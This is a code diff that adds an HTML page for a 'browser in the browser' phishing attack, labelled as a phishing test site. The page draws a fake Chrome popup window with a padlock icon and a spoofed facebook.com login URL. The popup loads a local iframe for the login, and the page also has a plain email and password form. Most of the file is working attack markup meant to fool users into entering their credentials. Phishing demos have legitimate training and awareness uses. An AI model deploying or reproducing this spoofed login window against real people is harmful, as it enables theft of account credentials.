@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing site BITB attack</title>
+    <link href="https://fonts.googleapis.com/css2?family=Muli:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="./assets/css/style-with-prefix.css">
+        <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <style>
+        .srouce{
+            text-align: center;
+            color: #ffffff;
+            padding: 10px;
+        }
+    </style>
+</head>
+<body>
+ <h2 class="title"> <li class="srouce"><center>Browser in the browser Attack - phishing test site</center></h2>
+    <div class="main-container">
+        <div class="form-container">
+
+        
+
+            <div class="form-body">
+                <h2 class="title">Log in with</h2>
+                <div class="social-login">
+                    <ul>
+                        <li class="google"><a href="#">Google</a></li>
+                        <li class="fb" button  id="clickme"><a href="#">Facebook</a></li>
+ 
+
+                    </ul>
+                </div>
+
+                <div class="_or">or</div>
+      <div id="window" style="margin:auto; position: absolute; bottom: 2.5%; display: none; ">                 
+<!-- Title bar start -->
+<div id="title-bar-width">
+    <div id="title-bar">
+        <div style="margin-top:5px;">
+            <img src="./logo.svg" width="20px" height="15px" id="logo">
+            <span id="logo-description">Facebook - Google Chrome</span>
+        </div>
+ 	
+        <div>
+            <span id="minimize">&#8212;</span>
+            <span id="square">□</span>
+            <span id="exit">✕</span>
+        </div>
+    </div>
+    <div id="url-bar">
+        <img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+        <span id="domain-name">https://www.facebook.com/login.php?skip_api_login=1&api_key=247847992027919&kid_directed_site=0&ap</span>
+    
+    </div>
+</div>  
+<iframe id="content" src="/facebook.html" frameBorder="0"></iframe>
+</div>
+<script src="script.js"></script>
+                <form action="" class="the-form">
+
+                    <label for="email">Email</label>    
+                    <input type="email" name="email" id="email" placeholder="Enter your email">
+
+                    <label for="password">Password</label>
+                    <input type="password" name="password" id="password" placeholder="Enter your password">
+
+                    <input type="submit" value="Log In">
+
+                </form>
+
+            </div><!-- FORM BODY-->
+
+            <div class="form-footer">
+                <div>
+                    <span>Don't have an account?</span> <a href="">Sign Up</a>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</body>
+</html>
